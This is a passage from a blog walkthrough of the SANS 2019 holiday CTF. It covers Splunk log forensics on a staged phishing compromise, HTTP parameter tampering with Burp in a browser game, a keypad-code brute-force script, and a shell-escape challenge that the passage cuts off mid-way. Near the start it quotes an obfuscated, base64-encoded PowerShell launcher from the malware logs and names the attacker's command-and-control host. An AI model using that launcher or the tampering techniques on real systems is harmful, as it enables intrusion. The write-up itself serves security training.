ParameterBinding(Out-String): name=&quot;InputObject&quot;; value=&quot;Microsoft.PowerShell.Commands.Internal.Format.FormatEntryData&quot;
ParameterBinding(Out-String): name=&quot;InputObject&quot;; value=&quot;Microsoft.PowerShell.Commands.Internal.Format.GroupEndData&quot;
ParameterBinding(Out-String): name=&quot;InputObject&quot;; value=&quot;Microsoft.PowerShell.Commands.Internal.Format.FormatEndData&quot;


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17134.858
        Host ID = c44dfd99-a4ba-452c-bf0d-07206a97112b
        Host Application = powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBKAG8AcgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBCAGwAeQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgA
        [...]
</pre></div>
<p>The file that was accessed is <code>C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</code>.</p>
</div>
<div class="section" id="third-question">
<h4><a class="toc-backref" href="#id19">Third question</a></h4>
<ol class="arabic simple" start="3">
<li>What is the fully-qualified domain name(FQDN) of the command and control(C2)
server? (Example: badguy.baddies.com)</li>
</ol>
<p>So, we know that the malware is likely using PowerShell. So let's search for
<code>powershell.exe</code> in the <a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20index%3Dmain%20powershell.exe&amp;display.page.search.mode=smart&amp;dispatch.sample_ratio=1&amp;earliest=0&amp;latest=now&amp;display.general.type=events&amp;display.page.search.tab=events&amp;sid=1577723101.3323">Splunk search engine</a>.</p>
<p>By looking at the different fields on the side, we can see one named
<code>DestinationHostname</code>, which is prety self-explanatory: it's likely the
hostnames that our PowerShell processes are communicating with:</p>
<img alt="splunk_powershell_destination_hostname.png" class="align-center" src="/images/sans-christmas-challenge-2019/splunk_powershell_destination_hostname.png" />
<p>We can see that around 92% of every events concerning <code>powershell.exe</code>
are communicating with the hostname <code>144.202.46.214.vultr.com</code>. This is
most likely our C2 FQDN.</p>
</div>
<div class="section" id="fourth-question">
<h4><a class="toc-backref" href="#id20">Fourth question</a></h4>
<ol class="arabic simple" start="4">
<li>What document is involved with launching the malicious PowerShell code?
Please provide just the filename. (Example: results.txt)</li>
</ol>
<p>Now, by taking a look at the different logs, we can see that Prof. Cabanas has
received a lot of emails by students, sending their assignments as attachments.
The most likely compromise path probably involves a malicious Microsoft Office
document with embedded macros that ran the malicious PowerShell code.</p>
<p>Let's search for the Microsoft Word process <code>WINWORD.EXE</code> in the <a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20winword.exe&amp;sid=1577783349.64&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;earliest=0&amp;latest=now">Splunk
search engine</a>.
By taking a look at the <code>RuleName</code> attributes, we can see that one
Microsoft Word process triggered a rule called &quot;Execution - Suspicious WMI
module load&quot;. This can indicate the execution of a macro in a Word document:</p>
<img alt="splunk_winword_rule.png" class="align-center" src="/images/sans-christmas-challenge-2019/splunk_winword_rule.png" />
<p>Let's investigate <a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20winword.exe%20RuleName%3D%22Execution%20-%20Suspicious%20WMI%20module%20load%22&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;earliest=0&amp;latest=now&amp;sid=1577783465.72">this particular</a>
<code>WINWORD.EXE</code> process. We can see from the Splunk search engine that it
was run at around 5:18 PM on 2019-08-25. This Microsoft Word process had a PID
of 6268.</p>
<img alt="splunk_winword_pid.png" class="align-center" src="/images/sans-christmas-challenge-2019/splunk_winword_pid.png" />
<p>Let's search only for this PID in the <a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20process_id%3D6268&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;earliest=0&amp;latest=now&amp;sid=1577783848A">Splunk search engine</a>.</p>
<img alt="splunk_winword_file_path.png" class="align-center" src="/images/sans-christmas-challenge-2019/splunk_winword_file_path.png" />
<p>We can see in the <code>file_path</code> attribute that this process opened a
document called <code>C:\Users\cbanas\AppData\Local\Packages\oice_16_974fa576_32c1d314_3570\AC\Temp\26251897.docm</code>.
This looks like a good candidate. Indeded, <code>.docm</code> documents are Office
Documents that can execute macros. However, <code>26251897.docm</code>, is not the
original name of this document.</p>
<p>We can see that it's in Prof Banas' temporary folder, with a temporary name.
This often happens if the file was directly open from the Internet, or from an
archive without first decompressing it to disk.</p>
<p>We know the Microsoft Word process responsible for executing the PowerShell
payload was launched at around 5:18 Pm on 2019-08-25. Let's look for <a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20mail&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;earliest=1566753300&amp;latest=1566753600&amp;sid=1577783990.89">emails
received around that time</a>.</p>
<p>We can see that only one email was received around that time:</p>
<img alt="splunk_email.png" class="align-center" src="/images/sans-christmas-challenge-2019/splunk_email.png" />
<p>It had, indeed, a ZIP archive as an attachment, containing a document called
<code>19th Century Holiday Cheer Assignment.docm</code>.</p>
</div>
<div class="section" id="fifth-question">
<h4><a class="toc-backref" href="#id21">Fifth question</a></h4>
<ol class="arabic simple" start="5">
<li>How many unique email addresses were used to send Holiday Cheer essays to
Professor Banas? Please provide the numeric value. (Example: 1)</li>
</ol>
<p>Now that is a question I find more easily answered using the <a class="reference external" href="http://elfu-soc.s3-website-us-east-1.amazonaws.com/">file archive</a>. We can <code>grep</code>
for <code>From:</code> header directly in the files:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> grep -hR <span class="s1">&#39;From: &#39;</span> .
<span class="go">From: Merry Fairybubbles &lt;Merry.Fairybubbles@students.elfu.org&gt;</span>
<span class="go">From: Carl Banas &lt;Carl.Banas@faculty.elfu.org&gt;</span>
<span class="go">From: Sixpence Snowcane &lt;Sixpence.Snowcane@students.elfu.org&gt;</span>
<span class="go">From: Sparkle Redberry &lt;Sparkle.Redberry@students.elfu.org&gt;</span>
<span class="go">From: Partridge Sugartree &lt;Partridge.Sugartree@students.elfu.org&gt;</span>
<span class="go">From: Turtledove Fairytree &lt;Turtledove.Fairytree@students.elfu.org&gt;</span>
<span class="go">From: Cherry Brandyfluff &lt;Cherry.Brandyfluff@students.elfu.org&gt;</span>
<span class="go">From: Carl Banas &lt;Carl.Banas@faculty.elfu.org&gt;</span>
<span class="go">From: Cupcake Silverlog &lt;Cupcake.Silverlog@students.elfu.org&gt;</span>
<span class="go">[...]</span>
</pre></div>
<p>Let's remove Prof Banas' email address from the results, and let's get only
unique outputs:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> grep -hR <span class="s1">&#39;From: &#39;</span> . <span class="p">|</span> sort -u <span class="p">|</span> grep -v <span class="s1">&#39;Carl Banas&#39;</span> <span class="p">|</span> wc -l
<span class="go">21</span>
</pre></div>
<p>Twenty-one unique email addresses were used to send essays to Prof Banas.</p>
</div>
<div class="section" id="sixth-question">
<h4><a class="toc-backref" href="#id22">Sixth question</a></h4>
<ol class="arabic simple" start="6">
<li>What was the password for the zip archive that contained the suspicious
file?</li>
</ol>
<p>In question four, we were able to find the malicious mail containing the
archive. Let's take a look <a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20mail&amp;display.page.search.mode=verbose&amp;dispatch.sample_ratio=1&amp;earliest=1566753300&amp;latest=1566753600&amp;sid=1577783990.89#">at this email</a> one more time. We can see in the
<code>results{}.workers.smtp.body</code> property the content of the email:</p>
<blockquote>
<p>professor banas, i have completed my assignment. please open the attached
zip file with password 123456789 and then open the word document to view
it. you will have to click &quot;enable editing&quot; then &quot;enable content&quot; to see
it. this was a fun assignment. i hope you like it!</p>
<p class="attribution">&mdash;bradly buttercups</p>
</blockquote>
<p>The password for the file is <code>123456789</code>.</p>
</div>
<div class="section" id="seventh-question">
<h4><a class="toc-backref" href="#id23">Seventh question</a></h4>
<ol class="arabic simple" start="7">
<li>What email address did the suspicious file come from?</li>
</ol>
<p>From the same email, we can find the sender's email address. It's
<code>bradly.buttercups&#64;eIfu.org&gt;</code>. You can notice that the second letter in
the domain is a capital <code>i</code> and not a lowercase <code>l</code>. It's a common
trick used when sending a phishing email.</p>
<p>Now let's mock Kent:</p>
<blockquote>
<p><strong>Guest (me):</strong> Oh man that's pretty embarrassing, eh?</p>
<p><strong>Kent:</strong> Oh you again?</p>
<p><strong>Guest (me):</strong> lulz...</p>
<blockquote>
Kent you are so unfair. And we were going to make you the king of the
Winter Carnival.</blockquote>
<p><strong>Kent:</strong> You'll rue the day.</p>
<p><strong>Guest (me):</strong> Who talks like that?</p>
</blockquote>
<p>Kent, you're the worst.</p>
</div>
</div>
</div>
<div class="section" id="objective-7">
<h2><a class="toc-backref" href="#id24">Objective 7:</a></h2>
<div class="section" id="the-dorm-room-s-keypad">
<h3><a class="toc-backref" href="#id25">The Dorm Room's Keypad</a></h3>
<p>There's a keypad controlling the access to the elves' dorm room. Since it's
colde outside, the keys are a little bit frosty:</p>
<img alt="frosty_keypad.png" class="align-center" src="/images/sans-christmas-challenge-2019/frosty_keypad.png" />
<p>We can kind of make out the keys that are most used: 1, 3, and 7. <a class="reference external" href="https://en.wikipedia.org/wiki/Leet">Naturally</a>,
I tried <code>1337</code>, but this wasn't the right code.</p>
<p>Luckily, Tangle Coalbox is here to provide us with clues.</p>
<img alt="tangle_coalbox.png" class="align-center" src="/images/sans-christmas-challenge-2019/tangle_coalbox.png" />
<p><em>Tangle Coalbox says</em></p>
<blockquote>
<p>Hey kid, it's me, Tangle Coalbox.</p>
<p>I'm sleuthing again, and I could use your help.</p>
<p>Ya see, this here number lock's been popped by someone.</p>
<p>I think I know who, but it'd sure be great if you could open this up for me.</p>
<p>I've got a few clues for you.</p>
<ol class="arabic simple">
<li>One digit is repeated once.</li>
<li>The code is a prime number.</li>
<li>You can probably tell by looking at the keypad which buttons are used.</li>
</ol>
</blockquote>
<p>Alright, we were on the right track: we can see which buttons are used, and our
first code had indeed one digit repeated once. However, 1337 is <a class="reference external" href="https://www.isprimenumber.com/prime/1337">not a prime
number</a>. So, let's code a little
script that will generate potential candidates. I used Python, with the
<a class="reference external" href="https://www.sympy.org/en/index.html">sympy</a> library to test primality:</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>

<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">permutations</span>
<span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="n">isprime</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="c1"># These are our three digits</span>
    <span class="n">base_digits</span> <span class="o">=</span> <span class="s1">&#39;137&#39;</span>
    <span class="n">valid_candidates</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>

    <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">base_digits</span><span class="p">:</span>
        <span class="c1"># We create a string with four digits, by repeating each digit once</span>
        <span class="n">doubled_digits</span> <span class="o">=</span> <span class="n">d</span> <span class="o">+</span> <span class="n">base_digits</span>
        <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">permutations</span><span class="p">(</span><span class="n">doubled_digits</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
            <span class="n">candidate</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">isprime</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">candidate</span><span class="p">)):</span>
                <span class="n">valid_candidates</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">candidate</span><span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">valid_candidates</span><span class="p">))</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
<div class="highlight"><pre><span></span>$ ./frost_key_pad.py
<span class="m">1373</span>
<span class="m">3371</span>
<span class="m">7331</span>
<span class="m">3137</span>
<span class="m">1733</span>
</pre></div>
<p>We now have only five candidates. By trying them each one by one, we find that
the correct code is <code>7331</code> (which is <code>1337</code> backwards, might have
found it with a little bit of guessing).</p>
<img alt="keypad_code.gif" class="align-center" src="/images/sans-christmas-challenge-2019/keypad_code.gif" />
</div>
<div class="section" id="minty-candy-cane-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id26">Minty Candy Cane's Cranberry Pi Challenge</a></h3>
<p>We have an old video game that we must beat:</p>
<blockquote>
<p>Welcome to the Trail! It's nearly time for Kringlecon. You need to get
there before the 25th day of December! Hitch up your reindeer, gather your
supplies, and do your best to make it to the North Pole on time.</p>
<p>Good luck!</p>
</blockquote>
<p>There are three difficulty level, easy, medium, and hard.</p>
<p>Now, let's select the easy mode, and start playing:</p>
<img alt="trail_easy_distance_0.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_easy_distance_0.png" />
<p>Hmm, we can see a <code>distance</code> parameter in the URL. We also see that we
have a remaining distance of 8000. What happends if we modify the
<code>distance</code> parameter in the URL?</p>
<img alt="trail_easy_distance_1.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_easy_distance_1.png" />
<p>Well, if we put <code>distance=1</code>, we can see that the remaining distance is
7999. So, let's put <code>distance=8000</code> and press GO:</p>
<img alt="trail_easy_distance_8000.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_easy_distance_8000.png" />
<p>Alright, that <em>was</em> easy! Let's try the medium mode:</p>
<img alt="trail_medium_distance_0.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_medium_distance_0.png" />
<p>So, no parameter in the URL. Let's launch Burp, and see what happens if we
press GO:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/trail/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">trail.elfu.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">416</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">trail-mix-cookie=fd1ec9a9109e6fd09265795ccebab2d65473a9d2</span>

pace=0&amp;playerid=JebediahSpringfield&amp;action=go&amp;difficulty=1&amp;money=3000&amp;distance=0&amp;curmonth=8&amp;curday=1&amp;name0=Jane&amp;health0=100&amp;cond0=0&amp;cause0=&amp;deathday0=0&amp;deathmonth0=0&amp;name1=Anna&amp;health1=100&amp;cond1=0&amp;cause1=&amp;deathday1=0&amp;deathmonth1=0&amp;name2=Vlad&amp;health2=100&amp;cond2=0&amp;cause2=&amp;deathday2=0&amp;deathmonth2=0&amp;name3=Vlad&amp;health3=100&amp;cond3=0&amp;cause3=&amp;deathday3=0&amp;deathmonth3=0&amp;reindeer=2&amp;runners=2&amp;ammo=50&amp;meds=10&amp;food=200&amp;hash=HASH
</pre></div>
<p>Ok, the <code>distance</code> parameter is not in the URL anymore, it's sent by
<code>POST</code>. So, let's press the GO button once more, intercept the request
in Burp, and change the <code>distance</code> value to 8000:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/trail/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">trail.elfu.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">416</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">trail-mix-cookie=fd1ec9a9109e6fd09265795ccebab2d65473a9d2</span>

pace=0&amp;playerid=JebediahSpringfield&amp;action=go&amp;difficulty=1&amp;money=3000&amp;distance=8000&amp;curmonth=8&amp;curday=1&amp;name0=Jane&amp;health0=100&amp;cond0=0&amp;cause0=&amp;deathday0=0&amp;deathmonth0=0&amp;name1=Anna&amp;health1=100&amp;cond1=0&amp;cause1=&amp;deathday1=0&amp;deathmonth1=0&amp;name2=Vlad&amp;health2=100&amp;cond2=0&amp;cause2=&amp;deathday2=0&amp;deathmonth2=0&amp;name3=Vlad&amp;health3=100&amp;cond3=0&amp;cause3=&amp;deathday3=0&amp;deathmonth3=0&amp;reindeer=2&amp;runners=2&amp;ammo=50&amp;meds=10&amp;food=200&amp;hash=HASH
</pre></div>
<img alt="trail_medium_distance_8000.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_medium_distance_8000.png" />
<p>Not too bad! Now, let's try the hard mode.</p>
<p>The hard mode works the same as the medium mode however, there is a
verification hash that is used to verify that we did not modify the state, as
we did previously. Here's the original request:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/trail/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">trail.elfu.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">452</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">trail-mix-cookie=f2a856a1e116d4c8e20dac88f31505dba60e7a17</span>

pace=0&amp;playerid=JebediahSpringfield&amp;action=go&amp;difficulty=2&amp;money=1500&amp;distance=0&amp;curmonth=9&amp;curday=1&amp;name0=Emmanuel&amp;health0=100&amp;cond0=0&amp;cause0=&amp;deathday0=0&amp;deathmonth0=0&amp;name1=Lila&amp;health1=100&amp;cond1=0&amp;cause1=&amp;deathday1=0&amp;deathmonth1=0&amp;name2=Mathias&amp;health2=100&amp;cond2=0&amp;cause2=&amp;deathday2=0&amp;deathmonth2=0&amp;name3=Joseph&amp;health3=100&amp;cond3=0&amp;cause3=&amp;deathday3=0&amp;deathmonth3=0&amp;reindeer=2&amp;runners=2&amp;ammo=10&amp;meds=2&amp;food=100&amp;hash=bc573864331a9e42e4511de6f678aa83
</pre></div>
<p>Now, let's see what happens it we try to modify the <code>distance</code> parameter:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/trail/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">trail.elfu.org</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">452</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">trail-mix-cookie=f2a856a1e116d4c8e20dac88f31505dba60e7a17</span>

pace=0&amp;playerid=JebediahSpringfield&amp;action=go&amp;difficulty=2&amp;money=1500&amp;distance=8000&amp;curmonth=9&amp;curday=1&amp;name0=Emmanuel&amp;health0=100&amp;cond0=0&amp;cause0=&amp;deathday0=0&amp;deathmonth0=0&amp;name1=Lila&amp;health1=100&amp;cond1=0&amp;cause1=&amp;deathday1=0&amp;deathmonth1=0&amp;name2=Mathias&amp;health2=100&amp;cond2=0&amp;cause2=&amp;deathday2=0&amp;deathmonth2=0&amp;name3=Joseph&amp;health3=100&amp;cond3=0&amp;cause3=&amp;deathday3=0&amp;deathmonth3=0&amp;reindeer=2&amp;runners=2&amp;ammo=10&amp;meds=2&amp;food=100&amp;hash=bc573864331a9e42e4511de6f678aa83
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.14.2</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Sun, 12 Jan 2020 21:35:13 GMT</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">198</span>
<span class="na">Set-Cookie</span><span class="o">:</span> <span class="l">trail-mix-cookie=8dc362d86d212e4032987287943a7b0f1c569ef1; expires=Mon, 13 Jan 2020 00:35:13 GMT; HttpOnly; Max-Age=10800; Path=/</span>

<span class="hll">&lt;html&gt;&lt;title&gt;Fail&lt;/title&gt;&lt;body style=&#39;background-color:black;&#39;&gt;&lt;font color=&#39;white&#39;&gt;Sorry, something&#39;s just not right about your status: badHash&lt;br&gt;You have fallen off the trail.&amp;trade;&lt;/body&gt;&lt;/html&gt;
</span></pre></div>
<p>Well, we can't modify the parameters anymore, they are checked. Or, are they?
By trying to modify different parameters, we can see which ones are checked in
the hash parameter. For example, we can't modify the distance, or our money.
But the reindeers' health is not checked. So, we can modify their health, so
that our reindeers is always to the max. We can use Burp's match and replace
functionality to do so:</p>
<img alt="trail_burp_match_replace.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_burp_match_replace.png" />
<p>Now, we can set the pace to &quot;Grueling&quot;, and keep progressing, and travel the
whole distance:</p>
<img alt="trail_hard_distance_8000.png" class="align-center" src="/images/sans-christmas-challenge-2019/trail_hard_distance_8000.png" />
</div>
<div class="section" id="get-access-to-the-steam-tunnels">
<h3><a class="toc-backref" href="#id27">Get Access To The Steam Tunnels</a></h3>
<p>When we get inside an elf's room, we see a weird looking guy running away:</p>
<img alt="dorm_krampus_running_away.gif" class="align-center" src="/images/sans-christmas-challenge-2019/dorm_krampus_running_away.gif" />
<p>We follow him into the closet, but we're face to a closed door, with a key ring
and a key hole. If we snoop around the room, we find a weird looking machine,
with six dials and a &quot;Cut&quot; button. Let's try something:</p>
<img alt="key_cutter.png" class="align-center" src="/images/sans-christmas-challenge-2019/key_cutter.png" />
<p>Alright! It's a key cutter. We can cut a key with different notch size.</p>
<img alt="001337.png" class="align-center" src="/images/sans-christmas-challenge-2019/001337.png" />
<p>If we manage to get a glimpse of the key opening the door in the closet, we can
cut a copy, and then open the door. But where can we see the key?</p>
<p>Looking back at the guy that ran away, we can see that he has a key dangling
from his belt. But he's running away fast, how can we get a good look at the
key? Well, we can use our browser's developer tools, head over to the &quot;Network&quot;
tab, and see the image of our guy being downloaded:</p>
<img alt="browser_network_panel_krampus.png" class="align-center" src="/images/sans-christmas-challenge-2019/browser_network_panel_krampus.png" />
<p>Let's download our <code>krampus.png</code>:</p>
<a class="reference external image-reference" href="/images/sans-christmas-challenge-2019/krampus.png"><img alt="krampus.png" class="align-center" src="/images/sans-christmas-challenge-2019/small_krampus.png" /></a>
<p>Now, we can open this image in our favorite image editor, and zoom in on the
key:</p>
<img alt="krampus_key_notches.png" class="align-center" src="/images/sans-christmas-challenge-2019/krampus_key_notches.png" />
<p>We can clearly see the six notches in this key. But how deep are they? We can
infer a couple of guesses:</p>
<img alt="krampus_key_notches_depth.png" class="align-center" src="/images/sans-christmas-challenge-2019/krampus_key_notches_depth.png" />
<ol class="arabic simple">
<li>Notch #6 seems to be of depth zero. We can determine this by cutting trial
keys on the key cutter.</li>
<li>Notch #1 seems to be one depth unit less than notch #2, but one depth unit
more than notch #6.</li>
<li>Notches #2, 3, and 5, seem to be the same depth.</li>
</ol>
<p>So, we can then venture that:</p>
<ul class="simple">
<li>Notch # 1 is depth 1</li>
<li>Notches #2, 3, and 5 are depth 2</li>
<li>Notch #6 is depth 0</li>
</ul>
<p>There is still some uncertainty regarding notch #4. It seems to be three or
four depth unit more than notch #2, which would make it 5 or 6. We can generate
both keys and try them both. Turns out that the correct key is <code>122520</code>:</p>
<img alt="122520.png" class="align-center" src="/images/sans-christmas-challenge-2019/122520.png" />
<p>We can now enter the steam tunnels, where we can find our runaway guy:</p>
<img alt="small_krampus.png" class="align-center" src="/images/sans-christmas-challenge-2019/small_krampus.png" />
<p><em>Krampus says</em></p>
<blockquote>
<p>Hello there! I’m Krampus Hollyfeld.</p>
<p>I maintain the steam tunnels underneath Elf U,</p>
<p>Keeping all the elves warm and jolly.</p>
<p>Though I spend my time in the tunnels and smoke,</p>
<p>In this whole wide world, there's no happier bloke!</p>
<p>Yes, I borrowed Santa’s turtle doves for just a bit.</p>
<p>Someone left some scraps of paper near that fireplace, which is a big fire
hazard.</p>
<p>I sent the turtle doves to fetch the paper scraps.</p>
<p>But, before I can tell you more, I need to know that I can trust you.</p>
<p>Tell you what – if you can help me beat the <a class="reference external" href="https://fridosleigh.com/">Frido Sleigh</a>
contest (Objective 8), then I'll know I can trust you.</p>
<p>The contest is here on my screen and at <a class="reference external" href="https://fridosleigh.com/">fridosleigh.com</a>.</p>
<p>No purchase necessary, enter as often as you want, so I am!</p>
<p>They set up the rules, and lately, I have come to realize that I have certain materialistic, cookie needs.</p>
<p>Unfortunately, it's restricted to elves only, and I can't bypass the CAPTEHA.</p>
<p>(That's Completely Automated Public Turing test to tell Elves and Humans Apart.)</p>
<p>I've already cataloged <a class="reference external" href="https://downloads.elfu.org/capteha_images.tar.gz">12,000 images</a>
and decoded the <a class="reference external" href="/docs/sans-christmas-challenge-2019/capteha_api.py">API interface</a>.</p>
<p>Can you help me bypass the CAPTEHA and submit lots of entries?</p>
</blockquote>
</div>
</div>
<div class="section" id="objective-8">
<h2><a class="toc-backref" href="#id28">Objective 8:</a></h2>
<div class="section" id="alabaster-snowball-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id29">Alabaster Snowball's Cranberry Pi Challenge</a></h3>
<p>Alabaster has a custom nyancat shell, but we're supposed to log into his
account and launch a regulard <code>bash</code> prompt:</p>
<div class="highlight"><pre><span></span><span class="go">░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░</span>
<span class="go">░░░░░░░░░░▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄░░░░░░░░░</span>
<span class="go">░░░░░░░░▄▀░░░░░░░░░░░░▄░░░░░░░▀▄░░░░░░░</span>
<span class="go">░░░░░░░░█░░▄░░░░▄░░░░░░░░░░░░░░█░░░░░░░</span>
<span class="go">░░░░░░░░█░░░░░░░░░░░░▄█▄▄░░▄░░░█░▄▄▄░░░</span>
<span class="go">░▄▄▄▄▄░░█░░░░░░▀░░░░▀█░░▀▄░░░░░█▀▀░██░░</span>
<span class="go">░██▄▀██▄█░░░▄░░░░░░░██░░░░▀▀▀▀▀░░░░██░░</span>
<span class="go">░░▀██▄▀██░░░░░░░░▀░██▀░░░░░░░░░░░░░▀██░</span>
<span class="go">░░░░▀████░▀░░░░▄░░░██░░░▄█░░░░▄░▄█░░██░</span>
<span class="go">░░░░░░░▀█░░░░▄░░░░░██░░░░▄░░░▄░░▄░░░██░</span>
<span class="go">░░░░░░░▄█▄░░░░░░░░░░░▀▄░░▀▀▀▀▀▀▀▀░░▄▀░░</span>
<span class="go">░░░░░░█▀▀█████████▀▀▀▀████████████▀░░░░</span>
<span class="go">░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░</span>
<span class="go">░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░</span>

<span class="go">nyancat, nyancat</span>
<span class="go">I love that nyancat!</span>
<span class="go">My shell&#39;s stuffed inside one</span>
<span class="go">Whatcha&#39; think about that?</span>

<span class="go">Sadly now, the day&#39;s gone</span>
<span class="go">Things to do!  Without one...</span>
<span class="go">I&#39;ll miss that nyancat</span>
<span class="go">Run commands, win, and done!</span>

<span class="go">Log in as the user alabaster_snowball with a password of Password2, and land in a Bash prompt.</span>

<span class="go">Target Credentials:</span>

<span class="go">username: alabaster_snowball</span>
<span class="go">password: Password2</span>
<span class="gp">elf@af7e11560ac9:~$</span>
</pre></div>
<p>We're given his credentials. Let's use the regular way to switch user context
with the <code>su</code> binary:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@af7e11560ac9:~$</span> su alabaster_snowball
<span class="go">Password:</span>
</pre></div>
<p>Aaaaand of course we're greeted by the nyancat.</p>
<img alt="nyanshell.png" class="align-center" src="/images/sans-christmas-challenge-2019/nyanshell.png" />
<p>Alright, let's take a look at Alabaster's shell:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@af7e11560ac9:~$</span> grep alabaster_snowball /etc/passwd
<span class="go">alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh</span>
<span class="gp">elf@af7e11560ac9:~$</span> ls -lh /bin/nsh
<span class="go">-rwxrwxrwx 1 root root 74K Dec 11 17:40 /bin/nsh</span>
</pre></div>
<p>So Alabaster's shell is <code>/bin/nsh</code>. The binary appears to be writeable by
anyone. So if we replace <code>/bin/nsh</code> by another binary,
say <code>/bin/bash</code>, we can drop into the correct prompt:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@af7e11560ac9:~$</span> cp /bin/bash /bin/nsh
<span class="go">cp: cannot create regular file &#39;/bin/nsh&#39;: Operation not permitted</span>
</pre></div>
